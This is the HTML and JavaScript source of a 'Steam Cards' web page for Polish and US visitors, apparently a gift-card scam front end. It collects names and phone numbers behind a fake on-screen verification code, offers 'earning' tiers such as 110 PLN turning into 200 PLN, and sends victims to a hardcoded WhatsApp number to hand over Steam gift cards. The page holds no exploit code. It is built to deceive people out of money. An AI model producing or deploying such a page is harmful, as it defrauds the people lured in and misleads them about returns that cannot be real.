<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Steam Cards</title>
<style>
  :root { --bg:#0b0c10; --card:#111318; --muted:#a9b0b8; --text:#e9eef3; --accent:#22c55e; --danger:#ef4444; --border:#23262d; }
  *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
  body{margin:0;background:linear-gradient(160deg,#0b0c10,#0f1115 40%,#0b0c10);color:var(--text);min-height:100vh}
  .wrap{max-width:960px;margin:24px auto;padding:20px}
  .card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:16px}
  h1{margin:0 0 10px;font-size:20px}
  label{display:block;color:var(--muted);font-size:13px;margin-bottom:6px}
  input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid var(--border);background:#0b0d12;color:var(--text)}
  .grid{display:grid;gap:12px}
  .cols-2{grid-template-columns:1fr 1fr}
  .toolbar{display:flex;gap:10px;align-items:center}
  .btn{background:#1f2937;color:var(--text);border:0;padding:10px;border-radius:10px;cursor:pointer}
  .btn-accent{background:#22c55e;color:#052e13}
  .top-right{position:fixed;right:20px;top:20px;display:flex;gap:10px}
  .mebtn{background:#0b0d12;border:1px solid var(--border);padding:8px 12px;border-radius:999px;cursor:pointer}
  .logoutbtn{background:#ef4444;border:1px solid #b91c1c;padding:8px 12px;border-radius:999px;cursor:pointer;color:white}
  .options{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:12px}
  .option{border:1px solid var(--border);padding:12px;border-radius:10px;background:transparent}
  .option h3{margin:0 0 6px;font-size:16px}
  .small{font-size:13px;color:var(--muted)}
  .hidden{display:none}
  .center{text-align:center}
  .badge{display:inline-block;padding:6px 10px;border-radius:999px;background:#0b0d12;border:1px solid var(--border);color:var(--muted);font-size:13px}
  .notif{position:fixed;left:20px;bottom:20px;padding:12px;border-radius:10px;background:#052e13;color:#c9f6de;border:1px solid #0a4a23}
  img.preview{max-width:100%;height:120px;object-fit:cover;border-radius:8px;border:1px solid #222}
  .small-muted{font-size:12px;color:var(--muted)}
  #backHomeBtn {margin-top:16px;width:100%;text-align:center;background:#1f2937;border:1px solid var(--border);}
</style>
</head>
<body>
<div class="top-right hidden" id="topBar">
  <button id="meBtn" class="mebtn">me ðŸš¹</button>
  <button id="logoutBtn" class="logoutbtn">Logout</button>
</div>

<div class="wrap">
  <!-- Signup/Login -->
  <div id="gate" class="card">
    <h1 id="gateTitle">Welcome â€” Signup / Login (US & Poland only)</h1>
    <div class="grid cols-2" style="margin-top:10px">
      <div>
        <label for="country" id="countryLabel">Country</label>
        <select id="country">
          <option value="">Chooseâ€¦</option>
          <option value="PL">Poland</option>
          <option value="US">United States</option>
        </select>
      </div>
      <div>
        <label for="lang" id="langLabel">Language</label>
        <select id="lang">
          <option value="pl">Polski</option>
          <option value="en" selected>English</option>
        </select>
      </div>
    </div>
    <div style="margin-top:12px" class="grid">
      <div>
        <label for="name" id="nameLabel">Name</label>
        <input id="name" placeholder="Your name">
      </div>
      <div>
        <label for="phone" id="phoneLabel">Phone</label>
        <input id="phone" placeholder="+48 ... or +1 ...">
      </div>
    </div>
    <div style="margin-top:12px" class="toolbar">
      <button id="sendCode" class="btn-accent">Send code</button>
      <div id="codeSent" class="badge">Not sent</div>
    </div>

    <div id="codeBox" class="badge hidden" style="margin-top:10px; background:#052e13; color:#c9f6de; font-weight:bold;"></div>

    <div id="verifyRow" class="grid hidden" style="margin-top:12px">
      <div>
        <label for="code" id="enterCodeLabel">Enter code</label>
        <input id="code" placeholder="Enter code">
      </div>
      <div class="center">
        <button id="finishSignup" class="btn-accent" style="margin-top:22px">Finish login</button>
      </div>
    </div>
  </div>

  <!-- Home -->
  <div id="home" class="card hidden">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div>
        <h1 id="homeTitle">Upload a card</h1>
        <div class="small-muted" id="uploadDesc">United States & Poland only â€” Steam gift card uploads only.</div>
      </div>
      <div class="center">
        <div class="small-muted" id="homeBalanceLabel">Balance</div>
        <div id="balanceDisplay" style="font-size:18px;font-weight:700">0.00 PLN</div>
      </div>
    </div>
    <input id="fileInput" type="file" accept="image/*" style="display:none">
    <div id="previewWrap" style="margin-top:10px"></div>
    <div style="margin-top:12px">
      <div class="small-muted" id="chooseMethodLabel">Choose method you want to earn:</div>
      <div class="options" id="optionsList"></div>
    </div>
  </div>

  <!-- Account -->
  <div id="meCard" class="card hidden">
    <h1 id="meTitle">My Account</h1>
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div>
        <div class="small-muted" id="meNameLabel">Name</div>
        <div id="meName" style="font-weight:700">-</div>
        <div class="small-muted" id="mePhoneLabel" style="margin-top:8px">Phone</div>
        <div id="mePhone">-</div>
      </div>
      <div>
        <div class="small-muted" id="meBalanceLabel">Balance</div>
        <div id="meBalance" style="font-weight:700;font-size:18px">0.00 PLN</div>
      </div>
    </div>
    <button id="backHomeBtn" class="btn">â¬… Back to Home</button>
  </div>
</div>

<div id="notif" class="notif hidden"></div>

<script>
const options = [
  { id:1, stake:110, profit:200 },
  { id:2, stake:220, profit:300 },
  { id:3, stake:330, profit:400 },
  { id:4, stake:440, profit:500 },
  { id:5, stake:550, profit:700 },
  { id:6, stake:800, profit:1000 },
  { id:7, stake:1110, profit:1250 },
  { id:8, stake:1300, profit:1450 },
  { id:9, stake:1600, profit:1750 },
  { id:10, stake:1800, profit:1950 },
];

const translations = {
  en: {
    welcome:"Welcome â€” Signup / Login (US & Poland only)",
    country:"Country", language:"Language",
    name:"Name", phone:"Phone",
    sendCode:"Send code", notSent:"Not sent",
    enterCode:"Enter code", finishLogin:"Finish login",
    uploadCard:"Upload a card",
    uploadDesc:"United States & Poland only â€” Steam gift card uploads only.",
    chooseMethod:"Choose method you want to earn:",
    balance:"Balance",
    myAccount:"My Account",
    backHome:"â¬… Back to Home",
    alertCountry:"Only Poland and United States allowed",
    alertMissing:"Enter name + phone",
    invalidPhone:"Invalid phone number for selected country!",
    invalidCode:"Invalid code",
    yourCode:"Your code: ",
    loginSuccess:"Login success",
    loggedOut:"Logged out",
    optionDesc:"Upload Steam gift card to receive",
    whatsappBtn:"ðŸ’¬ WhatsApp Me",
    waMessage:(name,stake,profit)=>`Hello, my name is ${name}. I want to select the option ${stake} PLN â†’ ${profit} PLN.`
  },
  pl: {
    welcome:"Witamy â€” Rejestracja / Logowanie (tylko USA i Polska)",
    country:"Kraj", language:"JÄ™zyk",
    name:"ImiÄ™", phone:"Telefon",
    sendCode:"WyÅ›lij kod", notSent:"Nie wysÅ‚ano",
    enterCode:"Wpisz kod", finishLogin:"ZakoÅ„cz logowanie",
    uploadCard:"PrzeÅ›lij kartÄ™",
    uploadDesc:"Tylko USA i Polska â€” tylko karty podarunkowe Steam.",
    chooseMethod:"Wybierz metodÄ™ zarabiania:",
    balance:"Saldo",
    myAccount:"Moje konto",
    backHome:"â¬… PowrÃ³t do strony gÅ‚Ã³wnej",
    alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone",
    alertMissing:"Wpisz imiÄ™ i telefon",
    invalidPhone:"NieprawidÅ‚owy numer telefonu dla wybranego kraju!",
    invalidCode:"NieprawidÅ‚owy kod",
    yourCode:"TwÃ³j kod: ",
    loginSuccess:"Logowanie zakoÅ„czone sukcesem",
    loggedOut:"Wylogowano",
    optionDesc:"PrzeÅ›lij kartÄ™ Steam, aby otrzymaÄ‡",
    whatsappBtn:"ðŸ’¬ Napisz na WhatsApp",
    waMessage:(name,stake,profit)=>`CzeÅ›Ä‡, mam na imiÄ™ ${name}. ChcÄ™ wybraÄ‡ opcjÄ™ ${stake} PLN â†’ ${profit} PLN.`
  }
};

const stateKey = "demo_safe_users";
const sessionKey = "demo_safe_session";
const langKey = "demo_safe_lang";
const countryKey = "demo_safe_country";

let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
let currentUser = JSON.parse(localStorage.getItem(sessionKey) || "null");
const whatsappNumber = "2348108462471"; // âœ… your WhatsApp number

function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
function saveSession(){ localStorage.setItem(sessionKey, JSON.stringify(currentUser)); }
function clearSession(){ localStorage.removeItem(sessionKey); }

const el = id => document.getElementById(id);
const show = id => el(id).classList.remove("hidden");
const hide = id => el(id).classList.add("hidden");
const notif = (t) => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); };

function updateLanguage(lang){
  localStorage.setItem(langKey, lang);
  // Gate
  el("gateTitle").textContent = translations[lang].welcome;
  el("countryLabel").textContent = translations[lang].country;
  el("langLabel").textContent = translations[lang].language;
  el("nameLabel").textContent = translations[lang].name;
  el("phoneLabel").textContent = translations[lang].phone;
  el("sendCode").textContent = translations[lang].sendCode;
  el("codeSent").textContent = translations[lang].notSent;
  el("enterCodeLabel").textContent = translations[lang].enterCode;
  el("finishSignup").textContent = translations[lang].finishLogin;

  // Home
  el("homeTitle").textContent = translations[lang].uploadCard;
  el("uploadDesc").textContent = translations[lang].uploadDesc;
  el("homeBalanceLabel").textContent = translations[lang].balance;
  el("chooseMethodLabel").textContent = translations[lang].chooseMethod;

  // Me
  el("meTitle").textContent = translations[lang].myAccount;
  el("meBalanceLabel").textContent = translations[lang].balance;
  el("meNameLabel").textContent = translations[lang].name;
  el("mePhoneLabel").textContent = translations[lang].phone;
  el("backHomeBtn").textContent = translations[lang].backHome;

  // Re-render options with correct language
  renderOptions();
}

function updateUI(){
  if(currentUser){
    hide('gate'); show('home'); hide('meCard'); show('topBar');
    el('balanceDisplay').textContent = (currentUser.balance || 0).toFixed(2) + " PLN";
    el('meName').textContent = currentUser.name || "-";
    el('mePhone').textContent = currentUser.phone || "-";
    el('meBalance').textContent = (currentUser.balance || 0).toFixed(2) + " PLN";
  } else {
    show('gate'); hide('home'); hide('meCard'); hide('topBar');
  }
}

function renderOptions(){
  const lang = localStorage.getItem(langKey) || 'en';
  const list = el('optionsList'); list.innerHTML = '';
  options.forEach(opt=>{
    const div = document.createElement('div'); div.className='option';
    div.innerHTML = `
      <h3>${opt.stake} PLN â†’ ${opt.profit} PLN</h3>
      <div class="small-muted">${translations[lang].optionDesc} ${opt.profit} PLN</div>
      <button class="btn" data-id="${opt.id}">${translations[lang].whatsappBtn}</button>
    `;
    list.appendChild(div);
  });
}

// WhatsApp button handler
document.addEventListener('click', (e)=>{
  if(e.target.matches('[data-id]')){
    const lang = localStorage.getItem(langKey) || 'en';
    const id = Number(e.target.getAttribute('data-id'));
    const opt = options.find(o=>o.id===id);
    if(opt && currentUser){
      currentUser.selectedOption = opt;
      saveSession();
      const message = translations[lang].waMessage(currentUser.name,opt.stake,opt.profit);
      const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
      window.open(url, "_blank");
    }
  }
});

// Country change â†’ set language + phone prefix
el("country").addEventListener("change", () => {
  const country = el("country").value;
  localStorage.setItem(countryKey, country);
  if(country === "PL"){
    el("lang").value = "pl"; updateLanguage("pl");
    if(!el("phone").value.startsWith("+48")) el("phone").value = "+48";
  } else if(country === "US"){
    el("lang").value = "en"; updateLanguage("en");
    if(!el("phone").value.startsWith("+1")) el("phone").value = "+1";
  }
});

// Keep prefix present if user deletes it
el("phone").addEventListener("input", () => {
  const country = el("country").value;
  let v = el("phone").value;
  if(country === "PL" && !v.startsWith("+48")) el("phone").value = "+48" + v.replace(/^\+?48?/, "");
  if(country === "US" && !v.startsWith("+1")) el("phone").value = "+1" + v.replace(/^\+?1?/, "");
});

el("lang").addEventListener("change", () => {
  updateLanguage(el("lang").value);
});

// Send code with strict PL/US phone validation
el('sendCode').addEventListener('click', ()=>{
  const country = el('country').value;
  const lang = el('lang').value;
  const name = el('name').value.trim();
  let phone = el('phone').value.trim();

  if(country !== 'PL' && country !== 'US'){ alert(translations[lang].alertCountry); return; }
  if(!name || !phone){ alert(translations[lang].alertMissing); return; }

  // Normalize and validate
  let isValid = false;
  if(country === "PL"){
    phone = "+48" + phone.replace(/^\+?48?/, "");
    isValid = /^\+48\d{9}$/.test(phone); // +48 + 9 digits
  } else if(country === "US"){
    phone = "+1" + phone.replace(/^\+?1?/, "");
    isValid = /^\+1\d{10}$/.test(phone); // +1 + 10 digits
  }
  if(!isValid){ alert(translations[lang].invalidPhone); return; }

  el("phone").value = phone; // keep corrected
  currentUser = users[phone] || { name, phone, balance:0 };
  currentUser.pendingCode = String(Math.floor(100000 + Math.random()*900000));
  users[phone] = currentUser; saveUsers();

  el('codeSent').textContent = 'âœ… ' + translations[lang].sendCode;
  show('verifyRow'); el('codeBox').classList.remove('hidden');
  el('codeBox').textContent = translations[lang].yourCode + currentUser.pendingCode;
});

el('finishSignup').addEventListener('click', ()=>{
  const lang = el('lang').value;
  const code = el('code').value.trim();
  if(!currentUser || code !== currentUser.pendingCode){ alert(translations[lang].invalidCode); return; }
  delete currentUser.pendingCode; users[currentUser.phone]=currentUser; saveUsers(); saveSession();
  notif(translations[lang].loginSuccess); updateUI();
});

el('meBtn').addEventListener('click', ()=>{ hide('home'); show('meCard'); });
el('backHomeBtn').addEventListener('click', ()=>{ hide('meCard'); show('home'); });
el('logoutBtn').addEventListener('click', ()=>{
  const lang = el('lang').value;
  currentUser=null; clearSession(); updateUI(); notif(translations[lang].loggedOut);
});

// Restore language, country, session on load
window.addEventListener("DOMContentLoaded", () => {
  const savedLang = localStorage.getItem(langKey) || "en";
  const savedCountry = localStorage.getItem(countryKey) || "";
  el("lang").value = savedLang;
  el("country").value = savedCountry;

  updateLanguage(savedLang);
  updateUI();

  // If phone empty, add prefix based on saved country
  if(!el("phone").value){
    if(savedCountry === "PL") el("phone").value = "+48";
    if(savedCountry === "US") el("phone").value = "+1";
  }
});
</script>
</body>
</html>